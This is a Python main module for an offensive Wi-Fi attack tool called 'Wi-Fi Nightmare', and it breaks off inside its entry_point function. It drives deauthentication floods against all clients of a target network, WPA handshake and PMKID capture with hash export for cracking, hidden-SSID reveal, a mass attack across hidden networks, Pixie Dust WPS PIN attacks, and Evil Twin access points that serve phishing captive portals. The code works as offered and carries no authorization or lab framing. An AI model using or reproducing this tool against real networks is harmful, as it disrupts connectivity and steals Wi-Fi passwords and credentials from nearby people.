# main.py
#!/usr/bin/env python3
import sys
import time
import os
import threading
from scapy.all import sniff, Dot11, EAPOL

# Allow running directly: python3 wifi_nightmare/main.py
if __name__ == "__main__" and __package__ is None:
    __package__ = "wifi_nightmare"
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import Modules
from wifi_nightmare.config import (
    C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_GREY, C_RESET,
    BAUDRATE, HANDSHAKES_DIR, ESP_HTML_LIMIT
)
import wifi_nightmare.utils as utils
import wifi_nightmare.ui as ui
import wifi_nightmare.portals as portals
from wifi_nightmare.database import DatabaseHandler
from wifi_nightmare.scanner import NetworkScanner, ClientMonitor
from wifi_nightmare.logger import logger, setup_logger
from wifi_nightmare.vif_check import get_vif_info

# Import ESP32 & Attack Modules
try:
    from wifi_nightmare.esp_driver import ESP32Driver
    from wifi_nightmare.handshake import NetworkAttacker
    from wifi_nightmare.eviltwin import EvilTwinAttack
except ImportError:
    ESP32Driver = None
    NetworkAttacker = None
    EvilTwinAttack = None

try:
    from wifi_nightmare.pixie_dust import PixieDustAttack
except ImportError:
    PixieDustAttack = None

from wifi_nightmare.capture_native import capture_handshake

class WifiGTR:
    def __init__(self, interface, serial_port=None):
        self.original_interface = interface
        self.interface = interface
        self.serial_port = serial_port
        self.db = DatabaseHandler()
        
        utils.check_root()
        utils.check_interface_exists(self.interface)
        
        self.scanner = None
        self.display_list = []
        self.esp_driver = None
        self.vif_info = None
        
    def start(self):
        logger.info("Starting Wi-Fi Nightmare")
        
        # 1. Enable Monitor Mode
        self.interface = utils.enable_monitor_mode(self.interface)
        utils.run_command(["ip", "link", "set", self.interface, "up"])
        
        # 2. Connect to ESP32 (if port provided)
        if self.serial_port:
            if ESP32Driver:
                print(f"{C_CYAN}[*] Connecting to ESP on port {self.serial_port}...{C_RESET}")
                logger.info(f"Connecting to ESP on {self.serial_port}")
                self.esp_driver = ESP32Driver(self.serial_port)
                
                if self.esp_driver.connect():
                    print(f"{C_GREEN}[+] ESP Connected Successfully.{C_RESET}")
                else:
                    print(f"{C_RED}[!] Failed to connect to ESP. Running in Standalone Mode.{C_RESET}")
                    logger.error("ESP connection failed")
                    self.esp_driver = None
                    time.sleep(1)
                    input("Press Enter to continue...")
            else:
                print(f"{C_RED}[!] ESP Modules missing. Running in Standalone Mode.{C_RESET}")
                input("Press Enter to continue...")
        else:
            print(f"{C_YELLOW}[*] No Serial Port provided. Running in Standalone Mode (No ESP features).{C_RESET}")
            logger.info("Running in standalone mode")
            input("Press Enter to continue...")

        # 3. Check VIF support (for software Evil Twin)
        print(f"{C_CYAN}[*] Checking Virtual Interface (VIF) support...{C_RESET}")
        self.vif_info = get_vif_info(self.interface)
        if self.vif_info["ready"]:
            print(f"{C_GREEN}[+] VIF Supported — Software Evil Twin available{C_RESET}")
        elif self.vif_info["supported"]:
            missing_tools = []
            if not self.vif_info["has_hostapd"]:
                missing_tools.append("hostapd")
            if not self.vif_info["has_dnsmasq"]:
                missing_tools.append("dnsmasq")
            print(f"{C_YELLOW}[*] VIF supported but missing: {', '.join(missing_tools)}{C_RESET}")
            print(f"{C_YELLOW}    Install: sudo apt-get install {' '.join(missing_tools)}{C_RESET}")
        else:
            print(f"{C_GREY}[-] VIF not supported ({self.vif_info['info']}){C_RESET}")
        logger.info(f"VIF info: {self.vif_info}")

        # 4. Start Scanner
        self.scanner = NetworkScanner(self.interface, self.db)
        self.main_loop()

    def main_loop(self):
        while True:
            try:
                ui.print_main_menu(self.interface)
                
                # Show ESP Status
                if self.esp_driver and self.esp_driver.is_connected:
                    esp_status = f"{C_GREEN}Connected ({self.serial_port}){C_RESET}"
                else:
                    esp_status = f"{C_GREY}Not Connected{C_RESET}"
                
                # Show VIF Status
                if self.vif_info and self.vif_info["ready"]:
                    vif_status = f"{C_GREEN}Supported{C_RESET}"
                elif self.vif_info and self.vif_info["supported"]:
                    vif_status = f"{C_YELLOW}Partial (missing tools){C_RESET}"
                else:
                    vif_status = f"{C_GREY}Not Supported{C_RESET}"

                print(f"    ESP Status : {esp_status}")
                print(f"    VIF Status : {vif_status}")
                print("--------------------------------------------------")
                
                choice = input(f"{C_YELLOW}[?]{C_RESET} Select Option: ").strip()
                
                if choice == '1':   # Scan
                    self.scan_workflow()
                elif choice == '2': # Client Monitor
                    if not self.scanner: 
                        print(f"{C_RED}[!] Error: Scanner not initialized.{C_RESET}")
                        continue
                    monitor = ClientMonitor(self.scanner)
                    monitor.start()
                    input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
                elif choice == '3': # Mass Attack
                    self.run_mass_attack()
                elif choice == '4': # Database
                    self.database_workflow()
                elif choice == '0':
                    self.cleanup()
                    sys.exit()
                else:
                    print(f"\n{C_RED}[!] Invalid option.{C_RESET}")
                    time.sleep(1)
            except KeyboardInterrupt:
                self.cleanup()
                sys.exit()

    def run_pixie_dust_workflow(self, bssid, channel, ssid):
        if PixieDustAttack is None:
            print(f"{C_RED}[!] Pixie Dust module not available.{C_RESET}")
            input("Press Enter...")
            return

        print(f"\n{C_CYAN}--- PIXIE DUST ATTACK ---{C_RESET}")
        print(f"Target  : {C_GREEN}{ssid}{C_RESET}")
        print(f"BSSID   : {bssid}")
        print(f"Channel : {C_YELLOW}{channel}{C_RESET}")

        try:
            from config import PIXIE_DUST_TIMEOUT
            timeout = PIXIE_DUST_TIMEOUT
        except ImportError:
            timeout = 120

        attacker = PixieDustAttack(
            interface=self.interface,
            target_bssid=bssid,
            target_channel=channel,
            target_ssid=ssid,
            timeout=timeout
        )

        result = None

        with utils.SignalManager() as sig:
            def _attack_thread():
                nonlocal result
                result = attacker.run()

            t = threading.Thread(target=_attack_thread, daemon=True)
            t.start()

            while t.is_alive():
                if sig.stopped:
                    attacker.stop()
                    break
                t.join(timeout=0.5)

        if sig.stopped:
            print(f"\n{C_YELLOW}[*] Pixie Dust attack interrupted.{C_RESET}")
        elif result:
            self.db.save(bssid, result.ssid if result.ssid and result.ssid != "Unknown" else ssid)
            if result.pin:
                self.db.update_wps_info(bssid, result.pin, result.psk or "")

        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def run_software_eviltwin(self, bssid, channel, ssid):
        if not self.vif_info or not self.vif_info["ready"]:
            if self.vif_info and not self.vif_info["supported"]:
                print(f"{C_RED}[!] Your adapter does not support Virtual Interfaces (VIF).{C_RESET}")
                print(f"{C_YELLOW}    Adapter info: {self.vif_info['info']}{C_RESET}")
            elif self.vif_info:
                missing = []
                if not self.vif_info["has_hostapd"]:
                    missing.append("hostapd")
                if not self.vif_info["has_dnsmasq"]:
                    missing.append("dnsmasq")
                print(f"{C_RED}[!] Missing tools for Software Evil Twin: {', '.join(missing)}{C_RESET}")
                print(f"{C_YELLOW}    Install: sudo apt-get install {' '.join(missing)}{C_RESET}")
            else:
                print(f"{C_RED}[!] VIF check not completed.{C_RESET}")
            input("Press Enter...")
            return

        try:
            from evil_twin_software import SoftwareEvilTwin
        except ImportError:
            print(f"{C_RED}[!] Software Evil Twin module not found.{C_RESET}")
            input("Press Enter...")
            return

        print(f"\n{C_CYAN}[*] Checking for existing Handshake...{C_RESET}")
        info = self.db.get_info(bssid)

        has_handshake = False
        if info and info.get('Handshake'):
            if info.get('HSFile') and os.path.exists(info['HSFile']):
                has_handshake = True

        if not has_handshake:
            print(f"{C_YELLOW}[!] No handshake for {ssid}. Capturing first...{C_RESET}")
            time.sleep(1)
            self.run_attack((bssid, channel), mode="handshake", auto_exit=True)
            info = self.db.get_info(bssid)
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']
            if not (info and info.get('Handshake') and os.path.exists(info.get('HSFile', ''))):
                print(f"{C_RED}[-] Failed to capture handshake.{C_RESET}")
                input("Press Enter...")
                return
        else:
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']

        if ssid == "<HIDDEN>" or ssid == "Unknown":
            manual = input(f"{C_YELLOW}[?] Enter SSID manually (empty to abort): {C_RESET}").strip()
            if not manual:
                return
            ssid = manual
            self.db.save(bssid, ssid)

        # Portal selection
        portal_html = None
        templates = portals.list_templates()
        has_custom = os.path.exists("custom_portal.html")

        print(f"\n{C_CYAN}[*] Select captive portal:{C_RESET}")
        for i, name in enumerate(templates, 1):
            print(f"  [{i}] {name}")
        if has_custom:
            print(f"  [C] Custom portal (custom_portal.html)")
        print(f"  [D] Default (built-in)")
        print()

        choice = input(f"{C_YELLOW}[?]{C_RESET} Portal [D]: ").strip().lower()

        if choice == 'c' and has_custom:
            try:
                with open("custom_portal.html", "r", encoding="utf-8") as f:
                    portal_html = f.read()
                print(f"{C_GREEN}[+] Using custom portal ({len(portal_html)} bytes){C_RESET}")
            except Exception:
                pass
        elif choice.isdigit() and 1 <= int(choice) <= len(templates):
            name = templates[int(choice) - 1]
            portal_html = portals.get_template(name)
            print(f"{C_GREEN}[+] Using: {name}{C_RESET}")
        else:
            print(f"{C_GREEN}[+] Using default portal{C_RESET}")

        print(f"\n{C_CYAN}[*] Starting Software Evil Twin on: {ssid} (CH {channel}){C_RESET}")

        et = SoftwareEvilTwin(
            interface=self.original_interface,
            target_bssid=bssid,
            target_channel=channel,
            target_ssid=ssid,
            db_handler=self.db,
            portal_html=portal_html
        )
        et.run()
        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def cleanup(self):
        print(f"\n{C_YELLOW}[*] Shutting down...{C_RESET}")
        logger.info("Shutting down")
        
        # Stop ESP32 safely (close() sends STOP command and closes serial)
        if self.esp_driver and self.esp_driver.is_connected:
            print(f"{C_RED}[*] Stopping ESP...{C_RESET}")
            self.esp_driver.close()
            print(f"{C_GREEN}[+] ESP Stopped.{C_RESET}")
            
        # Restore the ORIGINAL interface (not self.interface which may have changed to wlan0mon)
        restore_iface = getattr(self, 'original_interface', self.interface)
        utils.restore_managed_mode(restore_iface)
        
        print(f"{C_YELLOW}[*] Exiting.{C_RESET}")

    def scan_workflow(self):
        self.interface = utils.enable_monitor_mode(self.interface)
        utils.run_command(["ip", "link", "set", self.interface, "up"])
        
        self.run_scanner_process()
        
        if not self.display_list:
            input("No networks found. Press Enter...")
            return

        target = self.select_target_from_list()
        if not target: return 

        bssid, channel = target
        net_info = self.scanner.networks[bssid]
        ssid_name = net_info['SSID']
        client_count = len(net_info.get('Clients', []))

        while True:
            ui.print_target_menu(ssid_name, bssid, channel, client_count)
            
            # Option 6: ESP Evil Twin
            if self.esp_driver and self.esp_driver.is_connected:
                print(f"{C_WHITE}[6] Evil Twin (ESP){C_RESET}")
            else:
                print(f"{C_GREY}[6] Evil Twin (ESP) — No ESP connected{C_RESET}")

            # Option 7: Software Evil Twin (VIF)
            if self.vif_info and self.vif_info["ready"]:
                print(f"{C_WHITE}[7] Evil Twin (Software — No ESP needed){C_RESET}")
            elif self.vif_info and self.vif_info["supported"]:
                print(f"{C_YELLOW}[7] Evil Twin (Software) — Missing tools{C_RESET}")
            else:
                print(f"{C_GREY}[7] Evil Twin (Software) — VIF not supported{C_RESET}")

            # Option 8: Pixie Dust (WPS)
            net_info = self.scanner.networks[bssid]
            if net_info.get('WPS'):
                if PixieDustAttack:
                    print(f"{C_WHITE}[8] Pixie Dust Attack (WPS){C_RESET}")
                else:
                    print(f"{C_YELLOW}[8] Pixie Dust — Module not loaded{C_RESET}")
            else:
                print(f"{C_GREY}[8] Pixie Dust — WPS not detected{C_RESET}")

            print(f"{C_CYAN}-{'-'*24}{C_RESET}")
            print(f"{C_WHITE}[0] Back to Scan{C_RESET}")

            action = input(f"{C_YELLOW}[?]{C_RESET} Select Action: ").strip()

            if action == '1': # Handshake
                self.run_attack((bssid, channel), mode="handshake")
            elif action == '2': # Reveal
                self.run_attack((bssid, channel), mode="reveal")
            elif action == '3': # Deauth
                self.run_attack((bssid, channel), mode="deauth_only")
            elif action == '4': # Passive
                self.run_attack((bssid, channel), mode="passive")
            elif action == '5': # Gen Hash
                # Generate hc22000
                info = self.db.get_info(bssid)
                if info and info.get('HSFile') and os.path.exists(info['HSFile']):
                     utils.generate_hc22000(info['HSFile'])
                     input("Press Enter to return to menu...")
                else:
                    print(f"{C_RED}[!] No handshake file found for this target.{C_RESET}")
                    if info and info.get('HSFile'):
                         print(f"    Missing file: {info['HSFile']}")
                    print(f"{C_YELLOW}[*] Capture a handshake first (Option 1).{C_RESET}")
                    time.sleep(2)
            elif action == '6': # Evil Twin Logic (ESP)
                if self.esp_driver and self.esp_driver.is_connected:
                    self.run_eviltwin_workflow(bssid, channel, ssid_name)
                else:
                    time.sleep(1)
            elif action == '7': # Software Evil Twin
                self.run_software_eviltwin(bssid, channel, ssid_name)
            elif action == '8': # Pixie Dust
                if not PixieDustAttack:
                    print(f"{C_RED}[!] Pixie Dust module not loaded.{C_RESET}")
                    time.sleep(1)
                else:
                    if not net_info.get('WPS'):
                        print(f"{C_YELLOW}[!] WPS not detected on this target. Attack may fail.{C_RESET}")
                        confirm = input(f"{C_YELLOW}[?] Try anyway? (y/n): {C_RESET}").strip().lower()
                        if confirm != 'y':
                            continue
                    self.run_pixie_dust_workflow(bssid, channel, ssid_name)
            elif action == '0':
                break
            else:
                print(f"\n{C_RED}[!] Invalid option.{C_RESET}")
                time.sleep(1)

    def run_eviltwin_workflow(self, bssid, channel, ssid):
        if not self.esp_driver or not self.esp_driver.is_connected:
            print(f"\n{C_RED}[!] Error: ESP connection lost.{C_RESET}")
            return

        print(f"\n{C_CYAN}[*] Checking for existing Handshake...{C_RESET}")
        info = self.db.get_info(bssid)
        
        has_handshake = False
        if info and info.get('Handshake'):
            if info.get('HSFile') and os.path.exists(info['HSFile']):
                has_handshake = True
        
        if not has_handshake:
            print(f"{C_YELLOW}[!] No handshake found for {ssid}. Starting Capture Attack first...{C_RESET}")
            time.sleep(1)
            
            # 1. Run attack (Reveal + Handshake)
            self.run_attack((bssid, channel), mode="handshake", auto_exit=True)
            
            # 2. Update DB info
            info = self.db.get_info(bssid)
            
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']
                print(f"{C_GREEN}[+] Target Decloaked: {ssid}{C_RESET}")

            # Verify handshake again
            if info and info.get('Handshake') and os.path.exists(info.get('HSFile', '')):
                print(f"{C_GREEN}[+] Handshake captured successfully.{C_RESET}")
                time.sleep(1)
            else:
                print(f"{C_RED}[-] Failed to capture handshake. Cannot start Evil Twin.{C_RESET}")
                # Debug info
                if info:
                    print(f"[Debug] DB Info: HS={info.get('Handshake')}, File={info.get('HSFile')}")
                else:
                    print("[Debug] Info is None")
                input("Press Enter...")
                return
        else:
            print(f"{C_GREEN}[+] Found valid handshake: {info['HSFile']}{C_RESET}")
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']
        
        # Final check for SSID before starting Evil Twin
        if ssid == "<HIDDEN>" or ssid == "Unknown":
             print(f"{C_YELLOW}[!] SSID could not be automatically revealed.{C_RESET}")
             manual_ssid = input(f"{C_YELLOW}[?] Enter SSID manually (or leave empty to abort): {C_RESET}").strip()
             if manual_ssid:
                 ssid = manual_ssid
                 self.db.save(bssid, ssid)
             else:
                 print(f"{C_RED}[!] Aborted.{C_RESET}")
                 return

        print(f"{C_CYAN}[*] Proceeding to Evil Twin with SSID: {ssid}{C_RESET}")

        if EvilTwinAttack:
            et_attack = EvilTwinAttack(self.esp_driver, self.db, bssid, channel, ssid, interface=self.interface)
            et_attack.run()
        else:
            print(f"{C_RED}[!] Error: EvilTwin module not loaded.{C_RESET}")
        
        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def run_scanner_process(self):
        self.scanner.stop_sniffing = False

        with utils.SignalManager() as sig:
            hopper = threading.Thread(target=self.scanner.channel_hopper, daemon=True)
            hopper.start()

            try:
                last_print = 0
                while not self.scanner.stop_sniffing and not sig.stopped:
                    try:
                        sniff(iface=self.interface, prn=self.scanner.packet_handler, count=0, timeout=0.1, store=0)
                    except OSError:
                        utils.run_command(["ip", "link", "set", self.interface, "up"])
                        continue

                    if time.time() - last_print > 0.5:
                        self.display_list = ui.print_scan_table(self.interface, self.scanner.networks, self.scanner.lock)
                        last_print = time.time()
            except KeyboardInterrupt:
                self.scanner.stop_sniffing = True

        print(f"\n{C_YELLOW}[!] Scan Stopped.{C_RESET}")

    def select_target_from_list(self):
        while True:
            try:
                choice = input(f"\n[?] Select Network ID (Enter to cancel): ").strip()
                if choice == "": return None
                
                if not choice.isdigit():
                    print(f"{C_RED}[!] Please enter a valid number.{C_RESET}")
                    continue
                    
                idx = int(choice)
                if 0 <= idx < len(self.display_list):
                    bssid = self.display_list[idx]
                    channel = self.scanner.networks[bssid]['Channel']
                    print(f"\n{C_GREEN}[+] Target Selected: {bssid} (CH: {channel}){C_RESET}")
                    utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
                    return (bssid, channel)
                else:
                    print(f"{C_RED}[!] Invalid ID. Choose 0-{len(self.display_list)-1}.{C_RESET}")
            except Exception as e:
                logger.error(f"Input error: {e}")
                return None

    def run_mass_attack(self):
        if not self.display_list:
            print(f"{C_RED}[!] You must Scan first to populate targets.{C_RESET}")
            self.run_scanner_process()

        if not self.display_list:
            print(f"{C_YELLOW}[!] No networks found during scan.{C_RESET}")
            input("Press Enter...")
            return

        if NetworkAttacker is None:
            print(f"{C_RED}[!] NetworkAttacker module not available.{C_RESET}")
            input("Press Enter...")
            return
            
        hidden_targets = []
        for bssid in self.display_list:
            net = self.scanner.networks[bssid]
            if net['Hidden'] and not net['Known']: 
                hidden_targets.append((bssid, net['Channel']))
        
        if not hidden_targets:
            print(f"{C_RED}[-] No unknown hidden networks found.{C_RESET}")
            input("Press Enter...")
            return

        print(f"\n{C_CYAN}[*] Found {len(hidden_targets)} hidden networks.{C_RESET}")
        try: 
            user_input = input(f"[?] Duration per network (seconds, default 30): ").strip()
            duration = int(user_input) if user_input else 30
        except ValueError: 
            duration = 30
            
        print(f"{C_YELLOW}[*] Starting Mass Attack... (Ctrl+C to Skip current){C_RESET}")
        
        results_count = 0
        for i, (bssid, channel) in enumerate(hidden_targets):
            print(f"\n{C_WHITE}--- Target {i+1}/{len(hidden_targets)}: {bssid} ---{C_RESET}")
            utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
            
            attacker = NetworkAttacker(
                interface=self.interface,
                target_bssid=bssid,
                target_channel=channel,
                db_handler=self.db,
                attack_mode="reveal"
            )
            
            with utils.SignalManager() as sig:
                attacker.start_deauth_thread()
                
                start_time = time.time()
                while not attacker.success and not sig.stopped:
                    if time.time() - start_time > duration:
                        break 
                    try:
                        sniff(iface=self.interface, prn=attacker.sniffer_callback, count=0, timeout=0.5, store=0)
                    except OSError:
                        utils.run_command(["ip", "link", "set", self.interface, "up"])

            attacker.stop_attack = True 
            attacker.join_threads()

            if attacker.success and attacker.result_data:
                self.db.save(bssid, attacker.result_data['SSID'])
                print(f"\n{C_GREEN}[+] SUCCESS: {bssid} -> {attacker.result_data['SSID']}{C_RESET}")
                results_count += 1
        
        print(f"\n{C_CYAN}=== Mass Attack Finished. Revealed: {results_count} ==={C_RESET}")
        input("Press Enter...")

    def run_attack(self, target, mode="reveal", auto_exit=False):
        bssid, channel = target
        current_ssid = self.scanner.networks[bssid]['SSID']
        if current_ssid == "<HIDDEN>": current_ssid = "Unknown"
        
        if NetworkAttacker is None:
            print(f"{C_RED}[!] Error: NetworkAttacker module not available.{C_RESET}")
            return
        
        utils.run_command(["ip", "link", "set", self.interface, "up"])
        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])

        # --- Native handshake capture (airodump-ng + mdk4/aireplay-ng) ---
        if mode == "handshake":
            timeout = 120
            try:
                from config import config as cfg
                timeout = cfg.get("attacks", {}).get("handshake_timeout", 120)
            except Exception:
                pass

            result = capture_handshake(
                interface=self.interface,
                bssid=bssid,
                channel=channel,
                timeout=timeout,
                ssid=current_ssid
            )

            if result:
                self.db.save(bssid, current_ssid)
                self.db.update_handshake(bssid, True, utils.get_current_time_12h(), filename=result)
                print(f"\n{C_GREEN}[+] Handshake captured!{C_RESET}")
                print(f"    File: {result}")
            else:
                print(f"\n{C_RED}[-] Handshake capture failed{C_RESET}")

            if not auto_exit:
                input("\nPress Enter to return to menu...")
            return

        attacker = NetworkAttacker(
            interface=self.interface, 
            target_bssid=bssid, 
            target_channel=channel, 
            db_handler=self.db, 
            attack_mode=mode, 
            target_ssid=current_ssid
        )
        
        msg = f"Mode: {mode.upper()}"
        print(f"{C_RED}[*] Starting: {msg} (Ctrl+C to Stop)...{C_RESET}")
        logger.info(f"Starting attack on {bssid} ({mode})")
        
        with utils.SignalManager() as sig:
            # Start deauth thread for appropriate modes
            if mode in ["deauth_only", "handshake", "reveal"]:
                attacker.start_deauth_thread()
                if mode == "deauth_only":
                    print(f"{C_YELLOW}[+] Sending deauth packets to {bssid}{C_RESET}")
                    print(f"{C_YELLOW}[+] Targeting all clients on channel {channel}{C_RESET}")

            # Start sniffer in a continuous background thread (gapless)
            sniffer_running = threading.Event()
            sniffer_running.set()
            def _sniffer_thread():
                def _should_stop(pkt):
                    return not sniffer_running.is_set()
                def _quick_filter(pkt):
                    return pkt.haslayer(Dot11) or pkt.haslayer(EAPOL)
                try:
                    sniff(iface=self.interface, prn=attacker.sniffer_callback,
                          store=0, stop_filter=_should_stop, lfilter=_quick_filter)
                except Exception as e:
                    logger.error(f"Sniffer thread crashed: {e}")
            st = threading.Thread(target=_sniffer_thread, daemon=True)
            st.start()

            esp_active = False
            if self.esp_driver and self.esp_driver.is_connected:
                if mode != "passive":
                    print(f"{C_YELLOW}[+] ESP Detected: Using 'Burst' Attack Mode.{C_RESET}")
                    esp_active = True

            loop_count = 0 
            last_esp_attack = 0 
            deauth_count = 0

            while not attacker.stop_attack:
                if sig.stopped:
                    attacker.stop_attack = True
                    break

                if mode == "handshake" and attacker.handshake_captured: 
                    if attacker.target_ssid in ("Unknown", "<HIDDEN>"):
                        if not hasattr(attacker, 'reveal_wait_start'):
                            attacker.reveal_wait_start = time.time()
                            print(f"\n{C_YELLOW}[*] Handshake captured. Waiting for SSID Reveal...{C_RESET}")
                        if time.time() - attacker.reveal_wait_start > 10:
                            break
                    else:
                        break
                
                if mode == "pmkid" and attacker.pmkid_captured: 
                    break
                if mode == "reveal" and attacker.success: 
                    break
                
                current_time = time.time()
                loop_count += 1 
                
                if mode == "passive":
                    status = "Listening"
                elif mode == "deauth_only":
                    status = "Deauthing"
                    if hasattr(attacker, 'deauth_sent'):
                        deauth_count = attacker.deauth_sent
                else:
                    status = "Attacking"
                
                if esp_active and mode != "passive":
                    if current_time - last_esp_attack > 5:
                        self.esp_driver.start_attack(bssid, channel, duration=2)
                        last_esp_attack = current_time

                clients_str = f"{len(attacker.clients)} Clients"
                eapol_str = f" | EAPOL: {len(attacker.eapol_packets)}" if attacker.eapol_packets else ""
                if mode == "deauth_only":
                    clients_str = f"{len(attacker.clients)} Clients, {deauth_count} Deauths"
                
                ssid_display = attacker.target_ssid if attacker.target_ssid != "Unknown" else ""
                if ssid_display: 
                    ssid_display = f"({C_GREEN}{ssid_display}{C_RESET}) "

                dual_msg = f" {C_RED}+ ESP{C_RESET}" if esp_active else ""
                alert_msg = ""
                
                if hasattr(attacker, 'extended_capture_start'):
                    elapsed = int(time.time() - attacker.extended_capture_start)
                    remaining = max(0, 10 - elapsed)
                    alert_msg = f" {C_CYAN}[Context frames: {remaining}s]{C_RESET}"
                elif attacker.handshake_captured: 
                    alert_msg = f" {C_GREEN}[HANDSHAKE!]{C_RESET}"
                elif attacker.pmkid_captured: 
                    alert_msg = f" {C_GREEN}[PMKID!]{C_RESET}"

                sys.stdout.write(f"\r\033[K[{loop_count}] [*] {status}{dual_msg}{alert_msg} {ssid_display}> {clients_str}{eapol_str} | Pkts: {attacker.sniff_count}")
                sys.stdout.flush()
                
                time.sleep(0.5)

        sniffer_running.clear()
        attacker.stop_attack = True
        attacker.join_threads()
        
        if esp_active:
            self.esp_driver.stop_all()

        if mode == "deauth_only":
            print(f"\n{C_YELLOW}[*] Deauth Attack Finished{C_RESET}")
            print(f"    Target: {bssid}")
            print(f"    Channel: {channel}")
            print(f"    SSID: {current_ssid if current_ssid != 'Unknown' else 'Hidden'}")
            print(f"    Clients Targeted: {len(attacker.clients)}")
            if hasattr(attacker, 'deauth_sent'):
                print(f"    Deauth Packets Sent: {attacker.deauth_sent}")
            print(f"    Duration: {loop_count * 0.5:.1f} seconds")
            
        elif attacker.handshake_captured or attacker.pmkid_captured:
            final_ssid = attacker.target_ssid
            if final_ssid != "Unknown":
                self.db.save(bssid, final_ssid)
            
            f_type = "PMKID" if attacker.pmkid_captured else "Handshake"
            self.db.update_handshake(bssid, True, utils.get_current_time_12h(), filename=attacker.handshake_filename)
            
            logger.info(f"{f_type} captured for {bssid}")
            print(f"\n{C_CYAN}[+] {f_type} Captured!{C_RESET}")
            print(f"    Saved to: {attacker.handshake_filename}")
            
        elif mode == "reveal" and attacker.success:
            self.db.save(bssid, attacker.result_data['SSID'])
            ui.print_attack_summary(attacker.result_data)
            
        else:
            print("\n[!] Attack Finished/Stopped.")
        
        if not auto_exit:
            input("\nPress Enter to return to menu...")

    def database_workflow(self):
        while True:
            ui.print_database_menu()
            op = input(f"{C_YELLOW}[?]{C_RESET} Select Action: ").strip()
            if op == '1':
                ui.show_saved_db(self.db)
                input("Press Enter...")
            elif op == '2':
                self.verify_password_logic()
            elif op == '0':
                break
            else:
                 print(f"\n{C_RED}[!] Invalid option.{C_RESET}")
                 time.sleep(0.5)

    def verify_password_logic(self):
        saved_list = ui.show_saved_db(self.db)
        if not saved_list:
            input("Press Enter...")
            return
            
        choice = input(f"{C_YELLOW}[?]{C_RESET} Enter Network ID to verify: ").strip()
        if choice.isdigit():
            idx = int(choice)
            if 0 <= idx < len(saved_list):
                bssid = saved_list[idx]
                data = self.db.get_info(bssid)
                pcap = data.get('HSFile', '')
                if not pcap or not os.path.exists(pcap):
                    print(f"{C_RED}[-] File missing.{C_RESET}")
                    input("Enter...")
                    return
                pwd = input(f"[?] Password for {data['SSID']}: ").strip()
                if utils.verify_password(pcap, bssid, data['SSID'], pwd):
                    print(f"\n{C_GREEN}[SUCCESS] Correct Password!{C_RESET}")
                else:
                    print(f"\n{C_RED}[FAILURE] Incorrect.{C_RESET}")
                input("Enter...")
        else:
            print(f"{C_RED}[!] Invalid ID.{C_RESET}")
            time.sleep(1)

    def custom_portal_workflow(self):
        has_esp = self.esp_driver and self.esp_driver.is_connected
        template_names = portals.list_templates()

        while True:
            # Check if custom portal is active locally
            status = f"{C_GREEN}Default (built-in){C_RESET}"
            if os.path.exists("custom_portal.html"):
                status = f"{C_CYAN}Custom (custom_portal.html){C_RESET}"

            ui.print_portal_menu(template_names, status, has_esp)

            choice = input(f"{C_YELLOW}[?]{C_RESET} Select Action: ").strip()

            if choice == '0':
                break
            elif choice.isdigit() and 1 <= int(choice) <= len(template_names):
                name = template_names[int(choice) - 1]
                html = portals.get_template(name)
                if html:
                    print(f"\n{C_CYAN}[*] Template: {name}{C_RESET}")
                    print(f"    Size: {len(html)} bytes")
                    preview = portals.get_template_preview(name)
                    print(f"    {preview}")

                    # Save locally
                    confirm = input(f"{C_YELLOW}[?] Save as custom portal? (y/n): {C_RESET}").strip().lower()
                    if confirm == 'y':
                        with open("custom_portal.html", "w", encoding="utf-8") as f:
                            f.write(html)
                        print(f"{C_GREEN}[+] Saved to custom_portal.html{C_RESET}")

                        # Also upload to ESP if connected
                        if has_esp:
                            upload = input(f"{C_YELLOW}[?] Also upload to ESP? (y/n): {C_RESET}").strip().lower()
                            if upload == 'y':
                                self.esp_driver.send_custom_portal(html)
                    input("Press Enter...")
            elif choice.upper() == 'C':
                # Load from file
                filepath = input(f"{C_YELLOW}[?] Enter HTML file path: {C_RESET}").strip()
                filepath = filepath.strip('"').strip("'")
                if not os.path.exists(filepath):
                    print(f"{C_RED}[!] File not found: {filepath}{C_RESET}")
                    input("Press Enter...")
                    continue
                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        html = f.read()
                    print(f"{C_CYAN}[*] Loaded {len(html)} bytes from {filepath}{C_RESET}")

                    if len(html) > ESP_HTML_LIMIT and has_esp:
                        print(f"{C_YELLOW}[!] Warning: {len(html)} bytes — ESP max is {ESP_HTML_LIMIT}. Software Evil Twin has no limit.{C_RESET}")

                    confirm = input(f"{C_YELLOW}[?] Save as custom portal? (y/n): {C_RESET}").strip().lower()
                    if confirm == 'y':
                        with open("custom_portal.html", "w", encoding="utf-8") as f:
                            f.write(html)
                        print(f"{C_GREEN}[+] Saved to custom_portal.html{C_RESET}")

                        if has_esp and len(html) <= ESP_HTML_LIMIT:
                            upload = input(f"{C_YELLOW}[?] Also upload to ESP? (y/n): {C_RESET}").strip().lower()
                            if upload == 'y':
                                self.esp_driver.send_custom_portal(html)
                    input("Press Enter...")
                except Exception as e:
                    print(f"{C_RED}[!] Error reading file: {e}{C_RESET}")
                    input("Press Enter...")
            elif choice.upper() == 'R':
                # Reset
                if os.path.exists("custom_portal.html"):
                    os.remove("custom_portal.html")
                    print(f"{C_GREEN}[+] Removed custom_portal.html{C_RESET}")
                else:
                    print(f"{C_YELLOW}[*] No custom portal to remove{C_RESET}")

                if has_esp:
                    confirm = input(f"{C_YELLOW}[?] Also clear from ESP? (y/n): {C_RESET}").strip().lower()
                    if confirm == 'y':
                        self.esp_driver.clear_custom_portal()
                input("Press Enter...")
            else:
                print(f"{C_RED}[!] Invalid option{C_RESET}")
                time.sleep(0.5)


def entry_point():
    """Console entry point for 'wifi-nightmare' command (generated by setuptools)."""
    import platform

    # Platform check
    if platform.system() != "Linux":
